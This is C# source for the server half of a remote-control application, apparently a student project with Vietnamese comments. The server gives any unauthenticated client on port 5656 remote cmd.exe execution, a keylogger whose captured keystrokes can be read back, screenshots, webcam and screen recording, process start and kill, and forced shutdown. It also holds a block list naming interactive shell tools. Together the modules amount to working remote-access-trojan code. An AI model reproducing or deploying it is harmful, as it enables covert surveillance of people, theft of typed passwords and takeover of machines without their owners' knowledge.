using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ServerApp
{
    public partial class server : Form
    {
        #region --- Variables & Objects ---

        // Trạng thái kết nối
        private volatile bool isClientConnected = false;

        // Các luồng xử lý
        private Thread serverThread;          // Luồng TCP chính
        private Thread udpDiscoveryThread;    // Luồng UDP Discovery
        private Thread keylogThread = null;   // Luồng Keylogger

        // Các object module (Giả định các class này đã tồn tại trong project của bạn)
        private WebcamRecorder.WebcamCapture webcamCapture = null;
        private ScreenRecorder.ScreenCapture screenCapture = null;

        // Performance Counters & System Info
        private PerformanceCounter cpuCounter;
        private PerformanceCounter ramCounter;
        private System.Timers.Timer statsTimer;

        // Biến lưu thông tin hệ thống (Dùng volatile để thread-safe cơ bản)
        private volatile string cachedSystemInfo = "0|0|Checking...|...|...|...|...";
        private string staticHardwareInfo = ""; // Thông tin tĩnh (CPU, RAM, HDD...)

        // Shell variable
        private string ShellCurrentPath = "";

        #endregion

        public server()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false; // Lưu ý: Hạn chế update UI từ luồng khác
            this.FormClosing += Server_FormClosing;

            // Khởi tạo các thông số hệ thống ở background để không làm đơ UI lúc mở
            Thread initThread = new Thread(InitializeSystemInfo);
            initThread.IsBackground = true;
            initThread.Start();

            // Dọn dẹp log cũ khi khởi động
            CleanUpOldLogs();
        }

        #region --- Initialization & Cleanup ---

        private void Server_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Kill toàn bộ process khi đóng Form để đảm bảo không còn thread chạy ngầm
            Process.GetCurrentProcess().Kill();
        }

        private void CleanUpOldLogs()
        {
            try
            {
                if (File.Exists(KeyLogger.appstart.path))
                    File.Delete(KeyLogger.appstart.path);
            }
            catch { }
        }

        private void InitializeSystemInfo()
        {
            try
            {
                // 1. Khởi tạo Counters (Mất 1-2s)
                cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
                ramCounter = new PerformanceCounter("Memory", "Available MBytes");
                cpuCounter.NextValue(); // Call đầu tiên luôn là 0

                // 2. Lấy thông tin tĩnh
                string hostname = Dns.GetHostName();
                string os = Environment.OSVersion.ToString();
                string ipAddr = GetLocalIPAddress();
                string cpuName = GetHardwareInfo("Win32_Processor", "Name");
                string gpuName = GetHardwareInfo("Win32_VideoController", "Name");
                string totalRam = GetTotalRAM();
                string diskInfo = GetDiskInfo();
                string screenRes = $"{Screen.PrimaryScreen.Bounds.Width}x{Screen.PrimaryScreen.Bounds.Height}";

                // Format: |Hostname|OS|IP|CPU_Name|GPU_Name|Total_RAM|Disk|Screen
                staticHardwareInfo = $"|{hostname}|{os}|{ipAddr}|{cpuName}|{gpuName}|{totalRam}|{diskInfo}|{screenRes}";

                // 3. Bật Timer cập nhật thông tin động (CPU, RAM usage)
                statsTimer = new System.Timers.Timer(1000);
                statsTimer.Elapsed += UpdateSystemStats;
                statsTimer.AutoReset = true;
                statsTimer.Enabled = true;
            }
            catch (Exception ex)
            {
                staticHardwareInfo = $"|Unknown|Error: {ex.Message}|...|...|...|...|...|...";
            }
        }

        private string GetDiskInfo()
        {
            try
            {
                var drives = DriveInfo.GetDrives()
                    .Where(d => d.IsReady && d.DriveType == DriveType.Fixed)
                    .Select(d => $"{d.Name.Replace("\\", "")} {d.AvailableFreeSpace / (1024 * 1024 * 1024)}/{d.TotalSize / (1024 * 1024 * 1024)}GB");

                string info = string.Join(", ", drives);
                return string.IsNullOrEmpty(info) ? "No Fixed Drives" : info;
            }
            catch { return "Unknown Disk"; }
        }

        #endregion

        #region --- Server Core Logic ---

        // Nút Open Server
        private void button1_Click(object sender, EventArgs e)
        {
            Button btn = sender as Button;
            if (btn != null)
            {
                btn.Enabled = false;
                btn.Text = "Running...";
            }

            // Chạy TCP Server (Port 5656)
            serverThread = new Thread(StartTcpServer);
            serverThread.IsBackground = true;
            serverThread.Start();

            // Chạy UDP Listener (Port 9999)
            udpDiscoveryThread = new Thread(StartUdpDiscoveryListener);
            udpDiscoveryThread.IsBackground = true;
            udpDiscoveryThread.Start();
        }

        private void StartTcpServer()
        {
            try
            {
                IPEndPoint ip = new IPEndPoint(IPAddress.Any, 5656);
                Program.server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                Program.server.Bind(ip);
                Program.server.Listen(100);

                while (true)
                {
                    try
                    {
                        // Chấp nhận kết nối
                        Socket tempClient = Program.server.Accept();

                        isClientConnected = true;
                        Program.client = tempClient;
                        Program.ns = new NetworkStream(Program.client);
                        Program.nr = new StreamReader(Program.ns);
                        Program.nw = new StreamWriter(Program.ns) { AutoFlush = true };

                        // Vào vòng lặp xử lý lệnh
                        HandleClientCommunication();
                    }
                    catch (Exception)
                    {
                        // Lỗi kết nối hoặc Client ngắt
                    }
                    finally
                    {
                        isClientConnected = false;
                        // Đóng socket client cũ để giải phóng tài nguyên
                        try { if (Program.client != null) Program.client.Close(); } catch { }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Server Error (Port 5656): " + ex.Message);
                Environment.Exit(1);
            }
        }

        private void HandleClientCommunication()
        {
            string cmd = "";
            // Reset lại đường dẫn Shell khi có kết nối mới (nếu muốn)
            // ShellCurrentPath = Path.GetPathRoot(AppDomain.CurrentDomain.BaseDirectory);

            while (true)
            {
                // Đọc lệnh từ Client
                if (!ReceiveCommand(out cmd)) return; // Nếu mất kết nối -> Return thoát ra ngoài

                Console.WriteLine($"[CMD] {cmd}"); // Debug log

                switch (cmd)
                {
                    case "CMD": RemoteShellModule(); break;
                    case "KEYLOG": KeyloggerModule(); break;
                    case "PROCESS": ProcessHandler("All"); break;
                    case "APPLICATION": ProcessHandler("App"); break;
                    case "TAKEPIC": ScreenshotModule(); break;
                    case "WEBCAM": WebcamModule(); break;
                    case "SCREEN_REC": ScreenRecModule(); break;
                    case "FILE":
                        FileManager fm = new FileManager();
                        fm.HandleFileCommand();
                        break;
                    case "SYSTEM_INFO": SendSystemInfo(); break;

                    // Power Commands
                    case "SHUTDOWN": Process.Start("shutdown", "/s /t 0 /f"); break;
                    case "RESTART": Process.Start("shutdown", "/r /t 0 /f"); break;

                    case "QUIT": return;
                    default: break;
                }
            }
        }

        // Hàm helper để nhận lệnh an toàn, trả về false nếu mất kết nối
        private bool ReceiveCommand(out string cmd)
        {
            cmd = "QUIT";
            try
            {
                string line = Program.nr.ReadLine();
                if (line == null) return false; // Client disconnect
                cmd = line;
                return true;
            }
            catch
            {
                return false;
            }
        }

        // Hàm helper để gửi dữ liệu text an toàn
        private void SendData(string data)
        {
            try
            {
                Program.nw.WriteLine(data);
                // Program.nw.Flush(); // Đã set AutoFlush = true
            }
            catch { }
        }

        #endregion

        #region --- Module: Remote Shell (CMD) ---

        public void RemoteShellModule()
        {
            string cmd = "";
            if (string.IsNullOrEmpty(ShellCurrentPath))
                ShellCurrentPath = Path.GetPathRoot(AppDomain.CurrentDomain.BaseDirectory);

            while (true)
            {
                if (!ReceiveCommand(out cmd)) return;
                if (cmd == "QUIT") return;
                if (cmd == "RESET") { ShellCurrentPath = ""; return; }

                if (cmd == "EXEC")
                {
                    string commandToRun = "";
                    if (!ReceiveCommand(out commandToRun)) return; // Đọc lệnh cần chạy
                    commandToRun = commandToRun.Trim();

                    string output = "";
                    string[] blacklist = { "powershell", "python", "bash", "sh" }; // Chặn các shell tương tác

                    if (blacklist.Any(b => commandToRun.ToLower().Contains(b)))
                    {
                        output = "Error: Interactive shells are not supported.\n";
                    }
                    else if (commandToRun.ToLower().StartsWith("cd ") || commandToRun.ToLower() == "cd..")
                    {
                        // Xử lý lệnh CD nội bộ
                        output = HandleCdCommand(commandToRun);
                    }
                    else if (commandToRun.Length == 2 && commandToRun[1] == ':')
                    {
                        // Xử lý đổi ổ đĩa (VD: D:)
                        output = HandleDriveChange(commandToRun);
                    }
                    else
                    {
                        // Chạy lệnh CMD thực sự
                        output = ExecuteCmd(commandToRun);
                    }

                    // Format prompt output
                    if (!output.EndsWith("\n") && output.Length > 0) output += "\n";
                    string promptPath = ShellCurrentPath.EndsWith("\\") && ShellCurrentPath.Length > 3
                                        ? ShellCurrentPath.Substring(0, ShellCurrentPath.Length - 1)
                                        : ShellCurrentPath;
                    output += promptPath + ">";

                    // Gửi độ dài trước, sau đó gửi nội dung (để hỗ trợ Unicode tốt hơn)
                    byte[] buffer = Encoding.UTF8.GetBytes(output);
                    SendData(buffer.Length.ToString());
                    try { Program.client.Send(buffer); } catch { }
                }
            }
        }

        private string HandleCdCommand(string cmd)
        {
            try
            {
                string pathArg = (cmd.Length > 2) ? cmd.Substring(2).Trim() : "";
                if (cmd.ToLower() == "cd..") pathArg = "..";

                string newPath = Path.GetFullPath(Path.Combine(ShellCurrentPath, pathArg));
                if (Directory.Exists(newPath))
                {
                    ShellCurrentPath = newPath;
                    return "";
                }
                return "The system cannot find the path specified.\n";
            }
            catch (Exception ex) { return ex.Message + "\n"; }
        }

        private string HandleDriveChange(string cmd)
        {
            try
            {
                if (Directory.Exists(cmd + "\\"))
                {
                    ShellCurrentPath = cmd.ToUpper() + "\\";
                    return "";
                }
                return "The system cannot find the drive specified.\n";
            }
            catch { return "Error changing drive.\n"; }
        }

        private string ExecuteCmd(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8,
                    WorkingDirectory = ShellCurrentPath
                };

                using (Process p = Process.Start(psi))
                {
                    if (!p.WaitForExit(5000)) // Timeout 5s
                    {
                        try { p.Kill(); } catch { }
                        return "Command timed out.\n";
                    }
                    string outStr = p.StandardOutput.ReadToEnd();
                    string errStr = p.StandardError.ReadToEnd();
                    return outStr + (string.IsNullOrEmpty(errStr) ? "" : "\n" + errStr);
                }
            }
            catch (Exception ex) { return "Execution Error: " + ex.Message + "\n"; }
        }

        #endregion

        #region --- Module: Keylogger ---

        public void KeyloggerModule()
        {
            KeyLogger.appstart.path = Application.StartupPath + @"\keylog_cache.txt";
            string cmd = "";

            while (true)
            {
                if (!ReceiveCommand(out cmd)) return;

                switch (cmd)
                {
                    case "HOOK":
                        if (keylogThread == null || !keylogThread.IsAlive)
                        {
                            keylogThread = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
                            keylogThread.SetApartmentState(ApartmentState.STA);
                            keylogThread.Start();
                        }
                        break;

                    case "UNHOOK":
                        if (keylogThread != null && keylogThread.IsAlive)
                        {
                            try { keylogThread.Abort(); } catch { }
                            keylogThread = null;
                        }
                        break;

                    case "STATUS":
                        bool isRunning = (keylogThread != null && keylogThread.IsAlive);
                        SendData(isRunning ? "RUNNING" : "STOPPED");
                        break;

                    case "CLEAR":
                        try { File.WriteAllText(KeyLogger.appstart.path, ""); } catch { }
                        SendData("Logs Cleared");
                        break;

                    case "PRINT":
                        string logContent = " ";
                        if (File.Exists(KeyLogger.appstart.path))
                        {
                            try
                            {
                                // Mở file với chế độ ReadWrite Share để tránh lỗi khi keylogger đang ghi
                                using (FileStream fs = new FileStream(KeyLogger.appstart.path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                using (StreamReader sr = new StreamReader(fs))
                                {
                                    logContent = sr.ReadToEnd();
                                }
                            }
                            catch { logContent = "Error reading log."; }
                        }
                        if (string.IsNullOrEmpty(logContent)) logContent = " ";
                        SendData(logContent);
                        break;

                    case "QUIT": return;
                }
            }
        }

        #endregion

        #region --- Module: Screenshot (Fixed Memory Leak) ---

        public void ScreenshotModule()
        {
            string cmd = "";
            while (true)
            {
                if (!ReceiveCommand(out cmd)) return;
                if (cmd == "QUIT") return;

                if (cmd == "TAKE")
                {
                    try
                    {
                        // SỬ DỤNG USING ĐỂ GIẢI PHÓNG RAM NGAY LẬP TỨC
                        using (Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                        {
                            using (Graphics g = Graphics.FromImage(bmp))
                            {
                                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                                using (MemoryStream ms = new MemoryStream())
                                {
                                    bmp.Save(ms, ImageFormat.Png);
                                    byte[] b = ms.ToArray();

                                    // Gửi size trước, sau đó gửi data
                                    SendData(b.Length.ToString());
                                    Program.client.Send(b);
                                }
                            }
                        }
                    }
                    catch
                    {
                        SendData("0"); // Báo lỗi hoặc ảnh rỗng
                    }
                }
            }
        }

        #endregion

        #region --- Module: Process & Application ---

        private void ProcessHandler(string mode)
        {
            string cmd = "";
            while (true)
            {
                if (!ReceiveCommand(out cmd)) return;
                if (cmd == "QUIT") return;

                if (cmd == "XEM")
                {
                    try
                    {
                        var allProcs = Process.GetProcesses();
                        var filteredList = (mode == "App")
                            ? allProcs.Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)).OrderBy(p => p.MainWindowTitle).ToList()
                            : allProcs.OrderBy(p => p.ProcessName).ToList();

                        SendData(filteredList.Count.ToString());

                        foreach (Process p in filteredList)
                        {
                            string name = (mode == "App") ? p.MainWindowTitle : p.ProcessName;
                            SendData(name);
                            SendData(p.Id.ToString());
                            SendData(p.Threads.Count.ToString());
                        }
                    }
                    catch { SendData("0"); }
                }
                else if (cmd == "KILL")
                {
                    if (ReceiveCommand(out cmd) && cmd == "KILLID")
                    {
                        string idStr = "";
                        if (ReceiveCommand(out idStr))
                        {
                            try
                            {
                                Process.GetProcessById(int.Parse(idStr)).Kill();
                                SendData($"Successfully killed ID: {idStr}");
                            }
                            catch (Exception ex) { SendData("Failed: " + ex.Message); }
                        }
                    }
                }
                else if (cmd == "START")
                {
                    if (ReceiveCommand(out cmd) && cmd == "STARTID")
                    {
                        string name = "";
                        if (ReceiveCommand(out name))
                        {
                            try
                            {
                                Process.Start(name);
                                SendData("Successfully started: " + name);
                            }
                            catch (Exception ex) { SendData("Failed: " + ex.Message); }
                        }
                    }
                }
            }
        }

        #endregion

        #region --- Module: Webcam ---

        public void WebcamModule()
        {
            string cmd = "";
            if (webcamCapture == null) webcamCapture = new WebcamRecorder.WebcamCapture();

            while (true)
            {
                if (!ReceiveCommand(out cmd)) return;

                switch (cmd)
                {
                    case "WEBCAM": break; // Sync check
                    case "ON": SendData(webcamCapture.TurnOn()); break;
                    case "OFF": SendData(webcamCapture.TurnOff()); break;
                    case "START_REC": SendData(webcamCapture.StartRecording()); break;
                    case "STATUS": SendData(webcamCapture.GetStatus()); break;
                    case "CLEAR": SendData(webcamCapture.ClearAllRecordings()); break;

                    case "GET_FRAME":
                        SendBytes(webcamCapture.GetCurrentFrameAsJpeg());
                        break;

                    case "STOP_REC":
                        string stopRes = webcamCapture.StopRecording();
                        SendData(stopRes);
                        if (stopRes.StartsWith("RECORDING_STOPPED"))
                        {
                            string[] parts = stopRes.Split('|');
                            if (parts.Length >= 2) SendLargeFile(webcamCapture.GetVideoBytes(parts[1]));
                            else SendData("0");
                        }
                        break;

                    case "GET_VIDEO":
                        if (ReceiveCommand(out string filename))
                            SendLargeFile(webcamCapture.GetVideoBytes(filename));
                        break;

                    case "QUIT": return;
                }
            }
        }

        #endregion

        #region --- Module: Screen Recording ---

        public void ScreenRecModule()
        {
            string cmd = "";
            if (screenCapture == null) screenCapture = new ScreenRecorder.ScreenCapture();

            while (true)
            {
                if (!ReceiveCommand(out cmd)) return;

                switch (cmd)
                {
                    case "SCREEN_REC": break;
                    case "START": SendData(screenCapture.StartStream()); break;
                    case "STOP": SendData(screenCapture.StopStream()); break;
                    case "START_REC": SendData(screenCapture.StartRecording()); break;
                    case "STATUS": SendData(screenCapture.GetStatus()); break;

                    case "GET_FRAME":
                        SendBytes(screenCapture.GetCurrentFrameAsJpeg());
                        break;

                    case "STOP_REC":
                        string stopRes = screenCapture.StopRecording();
                        SendData(stopRes);
                        if (stopRes.StartsWith("RECORDING_STOPPED"))
                        {
                            string[] parts = stopRes.Split('|');
                            if (parts.Length >= 2) SendLargeFile(screenCapture.GetVideoBytes(parts[1]));
                            else SendData("0");
                        }
                        break;

                    case "QUIT": return;
                }
            }
        }

        #endregion

        #region --- Helper: Send Bytes & Large Files ---

        // Gửi mảng byte nhỏ (cho Frame ảnh)
        private void SendBytes(byte[] data)
        {
            if (data != null && data.Length > 0)
            {
                SendData(data.Length.ToString());
                try { Program.client.Send(data); } catch { }
            }
            else
            {
                SendData("0");
            }
        }

        // Gửi file lớn (Chunking)
        private void SendLargeFile(byte[] data)
        {
            if (data == null || data.Length == 0)
            {
                SendData("0");
                return;
            }

            SendData(data.Length.ToString());

            try
            {
                int chunkSize = 1024 * 1024; // 1MB
                int offset = 0;
                while (offset < data.Length)
                {
                    int remaining = data.Length - offset;
                    int currentSize = Math.Min(chunkSize, remaining);
                    Program.client.Send(data, offset, currentSize, SocketFlags.None);
                    offset += currentSize;
                }
            }
            catch { }
        }

        #endregion

        #region --- Module: System Info (Optimized) ---

        public void SendSystemInfo()
        {
            // Chỉ cần gửi chuỗi đã được Timer cập nhật sẵn -> Tốc độ phản hồi cực nhanh
            SendData(cachedSystemInfo);
        }

        private void UpdateSystemStats(Object source, ElapsedEventArgs e)
        {
            try
            {
                float cpu = cpuCounter.NextValue();
                float ram = ramCounter.NextValue();

                string battery = "Unknown";
                try
                {
                    var pwr = SystemInformation.PowerStatus;
                    battery = (pwr.BatteryLifePercent * 100) + "%" + (pwr.PowerLineStatus == PowerLineStatus.Online ? " (Plugged)" : "");
                }
                catch { }

                TimeSpan uptime = TimeSpan.FromMilliseconds(Environment.TickCount);
                string uptimeStr = $"{uptime.Days}d {uptime.Hours}h {uptime.Minutes}m";

                // Update biến volatile
                cachedSystemInfo = $"{cpu:0.0}|{ram}|{battery}|{uptimeStr}" + staticHardwareInfo;
            }
            catch { }
        }

        private string GetHardwareInfo(string table, string property)
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT " + property + " FROM " + table))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        return obj[property]?.ToString() ?? "Unknown";
                    }
                }
            }
            catch { }
            return "Unknown Device";
        }

        private string GetTotalRAM()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        long memKb = long.Parse(obj["TotalVisibleMemorySize"].ToString());
                        return Math.Round((double)memKb / (1024 * 1024), 0) + " GB";
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private string GetLocalIPAddress()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork) return ip.ToString();
                }
            }
            catch { }
            return "127.0.0.1";
        }

        #endregion

        #region --- UDP Discovery ---

        private void StartUdpDiscoveryListener()
        {
            UdpClient udpServer = null;
            try
            {
                udpServer = new UdpClient(9999);
                IPEndPoint remoteEndpoint = new IPEndPoint(IPAddress.Any, 0);

                while (true)
                {
                    try
                    {
                        byte[] receivedData = udpServer.Receive(ref remoteEndpoint);
                        string message = Encoding.UTF8.GetString(receivedData);

                        if (message.Trim() == "DISCOVER_SERVER")
                        {
                            string hostname = Dns.GetHostName();
                            // Lấy IP của máy mà Client có thể thấy (cố gắng chọn IP LAN)
                            string serverIp = GetLocalIPAddress();
                            string status = isClientConnected ? "BUSY" : "READY";

                            string response = $"{hostname}|{serverIp}|{status}";
                            byte[] responseData = Encoding.UTF8.GetBytes(response);

                            udpServer.Send(responseData, responseData.Length, remoteEndpoint);
                        }
                    }
                    catch { } // Bỏ qua lỗi trong vòng lặp nhận tin
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"UDP Discovery Error (Port 9999): {ex.Message}");
            }
            finally
            {
                if (udpServer != null) udpServer.Close();
            }
        }

        #endregion
    }
}